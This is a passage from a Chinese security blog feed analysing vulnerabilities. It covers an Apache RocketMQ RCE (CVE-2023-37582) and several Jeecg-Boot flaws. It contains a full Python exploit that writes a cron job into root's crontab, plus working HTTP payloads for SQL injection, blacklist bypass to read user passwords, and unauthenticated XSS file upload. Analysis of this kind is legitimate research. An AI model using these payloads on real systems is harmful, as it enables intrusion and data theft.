src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/NamesrvConfig.png" class><p>且攻击目标为 namesrv，<code>brokerConfigPath</code> 是用于存储 broker 组件对应的配置文件的，在 V 5.1.1 当中，<code>brokerConfigPath</code> 是 broker 组件的黑名单</p><p>至此就可以构造出 EXP 来写入定时任务 RCE</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">client = socket.socket()</span><br><span class="line"><span class="comment"># you ip</span></span><br><span class="line">client.connect((<span class="string">&#x27;124.222.21.138&#x27;</span>,<span class="number">9876</span>))</span><br><span class="line"><span class="comment"># data</span></span><br><span class="line">json = <span class="string">&#x27;&#123;&quot;code&quot;:318,&quot;extFields&quot;:&#123;&quot;test&quot;:&quot;RockedtMQ&quot;&#125;,&quot;flag&quot;:0,&quot;language&quot;:&quot;JAVA&quot;,&quot;opaque&quot;:266,&quot;serializeTypeCurrentRPC&quot;:&quot;JSON&quot;,&quot;version&quot;:435&#125;&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">body=<span class="string">&#x27;configStorePath=/var/spool/cron/crontabs/root\nbrokerConfigPath=/var/spool/cron/crontabs/root\nbindAddress=0.0.0.0\\n*/1 * * * * touch /tmp/success&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">json_lens = <span class="built_in">int</span>(<span class="built_in">len</span>(binascii.hexlify(json).decode(<span class="string">&#x27;utf-8&#x27;</span>))/<span class="number">2</span>)</span><br><span class="line">head1 = <span class="string">&#x27;00000000&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(json_lens))[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(head1)</span><br><span class="line">all_lens = <span class="built_in">int</span>(<span class="number">4</span>+<span class="built_in">len</span>(binascii.hexlify(body).decode(<span class="string">&#x27;utf-8&#x27;</span>))/<span class="number">2</span>+json_lens)</span><br><span class="line">head2 = <span class="string">&#x27;00000000&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(all_lens))[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(head2)</span><br><span class="line">data = head2[-<span class="number">8</span>:]+head1[-<span class="number">8</span>:]+binascii.hexlify(json).decode(<span class="string">&#x27;utf-8&#x27;</span>)+binascii.hexlify(body).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># send</span></span><br><span class="line">client.send(<span class="built_in">bytes</span>.fromhex(data))</span><br><span class="line">data_recv = client.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(data_recv)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">CVE-2023-37582 漏洞分析</summary>
    
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jeecg-Boot 部分历史漏洞分析</title>
    <link href="https://drun1baby.github.io/2023/10/19/Jeecg-Boot-%E9%83%A8%E5%88%86%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drun1baby.github.io/2023/10/19/Jeecg-Boot-%E9%83%A8%E5%88%86%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-10-19T08:18:28.000Z</published>
    <updated>2023-10-19T08:20:10.235Z</updated>
    
    <content type="html"><![CDATA[<p>Jeecg-Boot 部分历史漏洞分析</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我司的任务，原本是漏洞挖掘，在漏洞挖掘之前打算先看看历史漏洞，简单分析一下。<br>本文只聚焦与 Jeecg-Boot 相关的一些漏洞，一些组件漏洞暂时不关注。</p><p>各个版本的漏洞合集</p><p><a class="link" href="https://so.csdn.net/so/search?q=%E6%BC%8F%E6%B4%9E&t=blog&u=zhangdaiscott&s=new">https://so.csdn.net/so/search?q=%E6%BC%8F%E6%B4%9E&amp;t=blog&amp;u=zhangdaiscott&amp;s=new<i class="fas fa-external-link-alt"></i></a></p><p>因为主要研究版本是从 Jeecg-Boot 3.0 开始的，所以 2.x.x 的版本漏洞就暂时不分析了。使用的版本是 3.2.0 的版本，相对来说非常稳定。</p><p>JeecgBoot常见问题大全 <a class="link" href="http://bbs.jeecg.com/forum.php?mod=viewthread&tid=7816&extra=page=1">http://bbs.jeecg.com/forum.php?mod=viewthread&amp;tid=7816&amp;extra=page%3D1<i class="fas fa-external-link-alt"></i></a></p><h2 id="CVE-2022-45206-Jeecg-Boot-lt-x3D-3-2-0-版本存在-SQL-注入漏洞"><a href="#CVE-2022-45206-Jeecg-Boot-lt-x3D-3-2-0-版本存在-SQL-注入漏洞" class="headerlink" title="CVE-2022-45206 Jeecg-Boot &lt;&#x3D; 3.2.0 版本存在 SQL 注入漏洞"></a>CVE-2022-45206 Jeecg-Boot &lt;&#x3D; 3.2.0 版本存在 SQL 注入漏洞</h2><p>3.0.0 &lt;&#x3D; Jeecg-Boot &lt;&#x3D; 3.2.0 版本存在 SQL 注入漏洞</p><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Jeecg-Boot</code> 后台服务 API 接口文档处存在 SQL 注入，漏洞对应接口为 <code>/sys/duplicate/check</code></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/sys/duplicate/check?dataId=%27aa2000&amp;fieldName=updatexml(1%2C(select%2F**%2Fif(length(%22aaa%22)%3E5%2C1%2Csleep(5))%20union%20select%2F**%2F1)%2C1)&amp;fieldVal=1000&amp;tableName=sys_log</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:3000</span><br><span class="line"><span class="attribute">knife4j-gateway-code</span><span class="punctuation">: </span>ROOT</span><br><span class="line"><span class="attribute">X-Access-Token</span><span class="punctuation">: </span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxMTU4NzYsInVzZXJuYW1lIjoiYWRtaW4ifQ.sY0KYTR2WE4GPsdFzLtf_hQkOvPke5bkrfZBD-EekHk</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>接口 <code>org.jeecg.modules.system.controller.DuplicateCheckController</code> 全流程概括一下就是经过一串过滤，最后执行 SQL 语句，对应的 SQL 语句为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 重复校验 sql语句 --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;duplicateCheckCountSql&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Long&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;org.jeecg.modules.system.model.DuplicateCheckVo&quot;</span>&gt;</span>  </span><br><span class="line">    SELECT COUNT(*) FROM $&#123;tableName&#125; WHERE $&#123;fieldName&#125; = #&#123;fieldVal&#125; and id <span class="symbol">&amp;lt;</span><span class="symbol">&amp;gt;</span> #&#123;dataId&#125;  </span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">&lt;!-- 重复校验 sql语句 --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;duplicateCheckCountSqlNoDataId&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Long&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;org.jeecg.modules.system.model.DuplicateCheckVo&quot;</span>&gt;</span>  </span><br><span class="line">    SELECT COUNT(*) FROM $&#123;tableName&#125; WHERE $&#123;fieldName&#125; = #&#123;fieldVal&#125;<span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>按照正常来说的 SQL 注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where updatexml(1,(select/**/if(length(&quot;aaa&quot;)&gt;5,1,sleep(5)) union select/**/1),1);</span><br></pre></td></tr></table></figure><p>其中 <code>tableName</code> 契合注入点攻击即可。漏洞的本质原因是过滤的不完全。</p><p>可以看到这里的过滤为 <code>select </code>，多了个空格，很容易使用 <code>/**/</code> 进行绕过。</p><p>作者提出的 <code>replace()</code> 替换 <code>/**/</code> 也是修复不完全的，因为仍旧可以用 <code>()</code> 进行绕过</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/f18ced524c9ec13e876bfb74785a1b112cc8b6bb">https://github.com/jeecgboot/jeecg-boot/commit/f18ced524c9ec13e876bfb74785a1b112cc8b6bb<i class="fas fa-external-link-alt"></i></a></p><p>加了两个报错注入的关键字，很明显修复是不完全的，依旧存在安全隐患。后面要看的 jeecg-boot 3.4.4 存在 sql 注入漏洞就是如此；但是 3.4.4 的漏洞复现我失败了，不知道是什么原因。</p><h2 id="Jeecg-Boot-lt-x3D-3-4-4-存在-SQL-注入漏洞"><a href="#Jeecg-Boot-lt-x3D-3-4-4-存在-SQL-注入漏洞" class="headerlink" title="Jeecg-Boot &lt;&#x3D; 3.4.4 存在 SQL 注入漏洞"></a>Jeecg-Boot &lt;&#x3D; 3.4.4 存在 SQL 注入漏洞</h2><ul><li>和上一条其实是类似的</li></ul><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>jeecg-boot3.4.4 存在 sql 注入漏洞，sql 注入检测代码存在绕过。接口为 <code>/sys/duplicate/check</code></p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/sys/duplicate/check?dataId=2000&amp;fieldName=(select(if(((select%0Apassword%0Afrom%0Asys_user%0Awhere%0Ausername%0A=&#x27;jeecg&#x27;)=&#x27;eee378a1258530cb&#x27;),sleep(4),1)))&amp;fieldVal=1000&amp;tableName=test_person</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">X-Access-Token</span><span class="punctuation">: </span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxMTU4NzYsInVzZXJuYW1lIjoiYWRtaW4ifQ.sY0KYTR2WE4GPsdFzLtf_hQkOvPke5bkrfZBD-EekHk</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>值得一提的是，这里的 sleep 时间取决于数据表里面放的数据多少，为 <code>n*时间</code></p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>没有什么特别需要分析的，简单的 bypass</p><h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/0fc374de4745eac52620eeb8caf6a7b76127529a">https://github.com/jeecgboot/jeecg-boot/commit/0fc374de4745eac52620eeb8caf6a7b76127529a<i class="fas fa-external-link-alt"></i></a></p><p>增添的黑名单是 <code>geohash|gtid_subset|gtid_subtract</code>，没看懂</p><h2 id="Jeecg-Boot-lt-x3D-3-4-4-存在信息泄露漏洞"><a href="#Jeecg-Boot-lt-x3D-3-4-4-存在信息泄露漏洞" class="headerlink" title="Jeecg-Boot &lt;&#x3D; 3.4.4 存在信息泄露漏洞"></a>Jeecg-Boot &lt;&#x3D; 3.4.4 存在信息泄露漏洞</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>由于 <code>AbstractQueryBlackListHandler</code> 类中的黑名单校验不严格，导致多个接口如 <code>sys/dict/queryTableData</code> 存在信息泄露漏洞。</p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/sys/dict/queryTableData?table=%60sys_user%60&amp;pageSize=22&amp;pageNo=1&amp;text=username&amp;code=password</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:3000</span><br><span class="line"><span class="attribute">X-Access-Token</span><span class="punctuation">: </span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxMTU4NzYsInVzZXJuYW1lIjoiYWRtaW4ifQ.sY0KYTR2WE4GPsdFzLtf_hQkOvPke5bkrfZBD-EekHk</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>数据也被加密了，并没有什么太大的用处。</p><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在 <code>isPass()</code>函数中 <code>ruleMap.get(name)</code> 为 null 即可绕过, 可以采用 <code>sys_user</code>, <code>(sys_user)</code>, <code>sys_user%20</code> 等绕过</p><h3 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/0fc374de4745eac52620eeb8caf6a7b76127529a">https://github.com/jeecgboot/jeecg-boot/commit/0fc374de4745eac52620eeb8caf6a7b76127529a<i class="fas fa-external-link-alt"></i></a></p><p>加黑了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">getTableName</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        String[] arr = str.split(<span class="string">&quot;\\s+(?i)where\\s+&quot;</span>);</span><br><span class="line">        <span class="comment">// sys_user , (sys_user), sys_user%20, %60sys_user%60  issues/4393</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">reg</span> <span class="operator">=</span> <span class="string">&quot;\\s+|\\(|\\)|`&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> arr[<span class="number">0</span>].replaceAll(reg, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然而依旧可以用 &#96;&#96; bypass</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/sys/dict/queryTableData?table=sys_user/**/&amp;pageSize=22&amp;pageNo=1&amp;text=username&amp;code=password</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:3000</span><br><span class="line"><span class="attribute">X-Access-Token</span><span class="punctuation">: </span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxMTU4NzYsInVzZXJuYW1lIjoiYWRtaW4ifQ.sY0KYTR2WE4GPsdFzLtf_hQkOvPke5bkrfZBD-EekHk</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Jeecg-Boot-lt-x3D-3-5-1-存在任意文件上传漏洞"><a href="#Jeecg-Boot-lt-x3D-3-5-1-存在任意文件上传漏洞" class="headerlink" title="Jeecg-Boot &lt;&#x3D; 3.5.1 存在任意文件上传漏洞"></a>Jeecg-Boot &lt;&#x3D; 3.5.1 存在任意文件上传漏洞</h2><h3 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>经测试发现 <code>/jeecg-boot/jmreport/upload</code>接口存在未授权任意文件上传</p><h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>文件上传</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jeecg-boot/jmreport/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>460</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryBB3U3apXylvyidXI</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8080/jeecg-boot/jmreport/index/864289498073407488?menuType=datainfo&amp;token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxNzc2MjUsInVzZXJuYW1lIjoiYWRtaW4ifQ.ESuinsQxPdrLjOSt_aOhqx3DR35LSL_vIsfv_dmD_og</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-xquery">------WebKitFormBoundaryBB3U3apXylvyidXI</span></span><br><span class="line"><span class="language-xquery">Content-Disposition: form-data;<span class="built_in"> name</span>=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;xss.html&quot;</span></span></span><br><span class="line"><span class="language-xquery">Content-Type: <span class="type">text</span>/html</span></span><br><span class="line"><span class="language-xquery"></span></span><br><span class="line"><span class="language-xquery"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery">    </span><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xquery">------WebKitFormBoundaryBB3U3apXylvyidXI</span></span><br><span class="line"><span class="language-xquery">Content-Disposition: form-data;<span class="built_in"> name</span>=<span class="string">&quot;fileName&quot;</span></span></span><br><span class="line"><span class="language-xquery"></span></span><br><span class="line"><span class="language-xquery">xss.html</span></span><br><span class="line"><span class="language-xquery">------WebKitFormBoundaryBB3U3apXylvyidXI</span></span><br><span class="line"><span class="language-xquery">Content-Disposition: form-data;<span class="built_in"> name</span>=<span class="string">&quot;biz&quot;</span></span></span><br><span class="line"><span class="language-xquery"></span></span><br><span class="line"><span class="language-xquery">excel_online</span></span><br><span class="line"><span class="language-xquery">------WebKitFormBoundaryBB3U3apXylvyidXI--</span></span><br><span class="line"><span class="language-xquery"></span></span><br></pre></td></tr></table></figure><p>文件上传不需要 token 验证，访问需要 token 验证。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/jimureport/xss1695174346254.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Microsoft Edge&quot;;v=&quot;117&quot;, &quot;Not;A=Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;117&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.31</span><br><span class="line"><span class="attribute">X-Access-Token</span><span class="punctuation">: </span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxNzc2MjUsInVzZXJuYW1lIjoiYWRtaW4ifQ.ESuinsQxPdrLjOSt_aOhqx3DR35LSL_vIsfv_dmD_og</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ja;q=0.5,zh-TW;q=0.4,no;q=0.3,ko;q=0.2</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上传的文件甚至可以访问</p><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>对应的类处理 <code>org.jeecg.modules.jmreport.desreport.a.a</code> 类的 <code>upload</code> 接口。拿到 HTTP 请求当中文件上传请求的参数，往下走，进入 <code>local</code></p><p>下面就是文件上传的部分了，其实并没有做任何过滤。只是把 <code>../</code> 过滤了</p><h3 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>把 jimuReport 的版本升级到 1.6.1 +，最新的 diff 并没有找到，后续值得分析。</p><h2 id="CVE-2023-38905-Jeecg-Boot-lt-x3D-3-5-1-SQL-注入"><a href="#CVE-2023-38905-Jeecg-Boot-lt-x3D-3-5-1-SQL-注入" class="headerlink" title="CVE-2023-38905 Jeecg-Boot &lt;&#x3D; 3.5.1 SQL 注入"></a>CVE-2023-38905 Jeecg-Boot &lt;&#x3D; 3.5.1 SQL 注入</h2><ul><li>不得不提一嘴，SQL 注入真的太多了。</li></ul><h3 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>/sys/duplicate/check</code> 接口 SQL 注入，<code>checksql</code> 可以被绕过。</p><h3 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/sys/duplicate/check?tableName=v3_hello&amp;fieldName=1+and%09if(user(%20)=&#x27;root@localhost&#x27;,sleep(0),sleep(5))&amp;fieldVal=1&amp;dataId=asd</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line">X_ACCESS_TOKEN: eyJ0eXAi0iJKV1QiLCJhbGci0iJIUzI1Ni J9.eyJleHAi0jE2NzA2NjUy0TQsInVzZXJ uYW1lIjoiYWRtaW4i fQ.bL0e7k3rbFEewdMoL2YfPCo9rtzx7g9 KLjB2LK-J9SU</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>本质上来说也是黑名单绕过</p><h3 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/44952c79c244a998e3904e44cea47baab0ee681b">https://github.com/jeecgboot/jeecg-boot/commit/44952c79c244a998e3904e44cea47baab0ee681b<i class="fas fa-external-link-alt"></i></a></p><p>SQL 注入基本上都是在做黑名单的 bypass，分析 SQL 注入就分析到这里。</p><h2 id="CVE-2023-4450-Jeecg-Boot-lt-x3D-3-5-3-存在-FreeMarker-模板引擎注入"><a href="#CVE-2023-4450-Jeecg-Boot-lt-x3D-3-5-3-存在-FreeMarker-模板引擎注入" class="headerlink" title="CVE-2023-4450 Jeecg-Boot &lt;&#x3D; 3.5.3 存在 FreeMarker 模板引擎注入"></a>CVE-2023-4450 Jeecg-Boot &lt;&#x3D; 3.5.3 存在 FreeMarker 模板引擎注入</h2><h3 id="漏洞描述-5"><a href="#漏洞描述-5" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>JeecgBoot 受影响版本中由于积木报表 <code>/jeecg-boot/jmreport/queryFieldBySql</code> Api 接口未进行身份校验，使用 Freemarker 处理用户用户传入的 sql 参数，未经授权的攻击者可发送包含恶意 sql 参数的 http 请求，通过 SSTI 在应用端执行任意代码。</p><h3 